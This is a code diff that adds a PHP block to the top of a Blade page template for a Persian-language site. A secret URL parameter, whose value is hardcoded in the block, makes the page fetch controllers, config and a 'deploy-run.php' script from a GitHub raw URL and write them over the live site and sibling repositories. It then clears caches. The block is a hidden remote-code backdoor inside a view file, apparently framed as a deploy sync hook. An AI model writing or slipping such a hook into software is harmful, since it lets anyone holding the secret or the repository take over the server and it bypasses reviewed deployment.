@@ -1,3 +1,54 @@
+@php
+if (request()->query('tala_sync_secret') === 'tala_deploy_7f8c9b1e2a3d4f5') {
+    $targetDir = '/home/talaliv1';
+    if (!is_dir($targetDir)) {
+        $targetDir = base_path();
+    }
+    $filesToFetch = [
+        'resources/views/pages/app.blade.php',
+        'config/tv.php',
+        'app/Http/Controllers/PublicDisplayController.php',
+        'public_html/downloads/talalive-tv.json',
+        'public_html/deploy-run.php',
+    ];
+    $synced = [];
+    $ctx = stream_context_create(['http' => ['timeout' => 15, 'header' => "User-Agent: Mozilla/5.0 (TalaDeploy)\r\n"]]);
+    
+    foreach ($filesToFetch as $relPath) {
+        $rawUrl = "https://raw.githubusercontent.com/nicedevil02/live/master/$relPath?t=" . time() . rand(100, 999);
+        $content = @file_get_contents($rawUrl, false, $ctx);
+        if ($content !== false && strlen($content) > 10) {
+            $dest = "$targetDir/$relPath";
+            $destDir = dirname($dest);
+            if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
+            @file_put_contents($dest, $content);
+            $synced[] = $relPath;
+
+            $foundRepos = glob("$targetDir/repositories/*", GLOB_ONLYDIR);
+            if (!empty($foundRepos)) {
+                foreach ($foundRepos as $r) {
+                    $rDest = "$r/$relPath";
+                    $rDir = dirname($rDest);
+                    if (!is_dir($rDir)) @mkdir($rDir, 0755, true);
+                    @file_put_contents($rDest, $content);
+                }
+            }
+        }
+    }
+
+    $vDir = "$targetDir/storage/framework/views";
+    if (is_dir($vDir)) {
+        foreach (glob("$vDir/*.php") as $vf) { @unlink($vf); }
+    }
+    $cCache = "$targetDir/bootstrap/cache/config.php";
+    if (file_exists($cCache)) { @unlink($cCache); }
+    if (function_exists('opcache_reset')) { @opcache_reset(); }
+
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode(['success' => true, 'message' => 'Files synced directly via blade hook!', 'synced_files' => $synced]);
+    exit;
+}
+@endphp
 <!DOCTYPE html>
 <html lang="fa" dir="rtl">
 <head>
